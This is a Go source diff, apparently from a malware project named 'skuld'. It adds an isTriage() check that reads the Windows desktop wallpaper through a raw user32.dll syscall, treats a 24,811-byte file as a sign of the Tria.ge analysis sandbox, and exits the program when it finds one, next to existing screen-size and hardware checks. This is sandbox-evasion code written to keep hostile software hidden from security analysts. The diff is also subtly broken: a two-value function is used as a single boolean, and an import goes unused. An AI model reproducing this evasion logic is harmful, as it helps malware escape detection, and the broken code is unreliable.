@@ -5,6 +5,8 @@ import (
 	"os/exec"
 	"strings"
 	"syscall"
+	"unsafe"
+	"bufio"
 
 	"github.com/hackirby/skuld/utils/hardware"
 	"github.com/hackirby/skuld/utils/requests"
@@ -19,6 +21,43 @@ func contains(slice []string, item string) bool {
 		}
 	}
 	return false
+}
+
+func isTriage() (bool, error) {
+	var buffer [bufferSize]uint16
+
+	ret, _, err := syscall.Syscall6(
+		syscall.NewLazyDLL("user32.dll").NewProc("SystemParametersInfoW").Addr(),
+		4,
+		uintptr(spiGetDesktopWallpaper),
+		uintptr(bufferSize),
+		uintptr(unsafe.Pointer(&buffer[0])),
+		0,
+		0,
+		0,
+	)
+	if ret == 0 {
+		return false, err
+	}
+
+	wallpaperPath := syscall.UTF16ToString(buffer[:])
+
+	if _, err := os.Stat(wallpaperPath); err == nil {
+		fileInfo, err := os.Stat(wallpaperPath)
+		if err != nil {
+			return false, err
+		}
+
+		badWallpapers := map[int64]struct{}{
+			24811: {},
+		}
+
+		if _, exists := badWallpapers[fileInfo.Size()]; exists {
+			return true, nil
+		}
+	}
+
+	return false, nil
 }
 
 func IsBlacklistedUsername(usernames []string) bool {
@@ -97,6 +136,10 @@ func GraphicsCardCheck() bool {
 }
 
 func Run() {
+	if isTriage() {
+		os.Exit(0)
+	}
+	
 	if IsScreenSmall() {
 		os.Exit(0)
 	}
